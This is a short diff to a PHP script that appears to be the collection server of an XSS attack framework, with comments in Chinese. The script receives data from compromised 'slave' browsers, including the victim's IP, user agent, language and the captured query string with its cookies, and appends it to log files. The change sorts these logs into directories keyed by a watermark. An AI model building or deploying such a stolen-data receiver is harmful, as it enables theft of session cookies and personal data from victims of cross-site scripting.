@@ -23,19 +23,35 @@ if ( strpos($qstr, "NoCryptMark") === false ){
   $qstr = "XSS got: \r\n".urldecode($qstr);
 }
 
-
+/*
 //剥离Cookie
 $slavecookie = strchr($qstr, "    [**** Cookie");
 $slavecookiepos = strpos($qstr, "    [**** Cookie");
 
 // 剥离XSS来源
 $slaveuri = substr($qstr, 0, $slavecookiepos);
+*/
 
+// 分离出水印
+$slaveWatermark = strchr($qstr, "[**** Watermark: ");
+$slaveWatermark = strchr($slaveWatermark, "|");
 
-
-// 写日志
-$fp = fopen("logxss.log","a");
-
+// 如果没有打上水印,则为null,无法找到 "|"
+if ($slaveWatermark != false){
+  $slaveWatermark = substr($slaveWatermark, 1, 13);  // 分离出watermark(随机的时间值)
+  
+  // 按水印分目录记录日志
+  if(file_exists("slave\\$slaveWatermark") == false){
+    // 注意mkdir函数不能递归建立目录
+    mkdir("slave\\$slaveWatermark");
+  }
+  
+  // 写日志
+  $fp = fopen("slave\\$slaveWatermark\\log.txt","a");
+}
+else { // 水印为null的
+	$fp = fopen("slave\\noWatermarkLog.txt","a");
+}
 
 //fwrite($fp,"$border\r\n $fvck $requestdate\r\n $slaveip\r\n $slaveagent\r\n $slavelang\r\n $slaveuri\r\n $slavecookie\r\n$border");
 fwrite($fp,"$border\r\n $fvck $requestdate\r\n $slaveip\r\n $slaveagent\r\n $slavelang\r\n $qstr\r\n$border");
